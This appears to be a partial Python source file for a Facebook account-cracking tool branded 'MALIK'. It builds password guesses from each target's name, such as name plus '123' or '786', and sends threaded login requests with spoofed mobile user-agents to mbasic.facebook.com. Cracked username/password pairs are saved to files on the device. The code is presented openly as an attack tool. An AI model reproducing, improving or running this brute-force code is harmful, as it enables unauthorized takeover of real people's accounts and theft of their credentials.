import os,sys
try: import requests
except ModuleNotFoundError:print("mAlIk Install Module requests");os.system("python -m pip install requests &> /dev/mAlIk")
try: import bs4
except ModuleNotFoundError:print("mAlIk Install Module bs4");os.system("python -m pip install bs4 &> /dev/mAlIk")
try: import mechanize
except ModuleNotFoundError:print("mAlIk Install Module mechanize");os.system("python -m pip install mechanize &> /dev/mAlIk")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/malIk")
## import in
...
def main_apv():
    ...
    try:
        ...
        time.sleep(6)
        os.system("xdg-open https://wa.me/+923006871139")
...
def R():
			...
			print(" [2] Create File")
			print(" [3] FeedBack")
			print(" [4] WhatsApp Group ЁЯШ┤ soon") 
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		print('\n\033[1;92mTotal OK : %s тАв  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print(' \033[1;93m[*]\033[1;93m  Please Choose Pass Method\033[1;37m')
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;32m [MALIK] \033[1;97m%s/%s   \033[1;92mOK-:%s | \033[1;91mCP-:%s '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			try:
				...
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 12; CPH2251 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.88 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/362.0.0.27.109;]'
				ua_nokia   = 'NokiaC3-00/5.0 (08.70) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
			...
			_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/97.0.4674.2 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[Ok-MALIK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/MALIK_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/MALIK_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[CP-MALIK] %s | %s%s      ' % (user,pw,tahun(user)))
		...
		loop += 1
	def __pler__(self):
		print ("\033[1;91m [1] Auto 2 Pass (Fast) 800kb+ ")
		print (" [2] Auto 2 Pass (medium) 700kb+ ")
		...
		if yan == '':
			...
			time.sleep(1)
			print('\n[тАв] Result OK saved to OK.txt')
			print('[тАв] Result CP saved to CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=52) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						uid, name = yntkts.split('|')
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0] + 'first', xz[1]]
						elif len(xz) == 2:
							pwx = [name, xz[0] + 'last', xz[1]]
						elif len(xz) == 3:
							pwx = [name, xz[0] + 'first', xz[1]]
						else:
							pwx = [name, xz[0] + 'last', xz[1]]
			...
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
				for yntkts in self.id:
					try:
						...
						xz = name.split(' ')
						if len(xz) == 1:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"786"]
						elif len(xz) == 2:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"786"]
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"786"]
...
\033[1;97m$$ |\$  /$$ |$$ |  $$ |$$ |\$$$ |$$ |  $$ |
\033[1;97m$$ | \_/ $$ |\$$$$$$  |$$ | \$$ |$$ |  $$ |
\033[1;97m\__|     \__| \______/ \__|  \__|\__|  \__|
                                           
\033[1;95m=================================
    Author   : MR.  MUNNA
    Facebook : MUHAMMAD HASSAn
    KING OFF : MAAR   KHOOR
    Connect    : 03120367***
\033[1;92m =================================
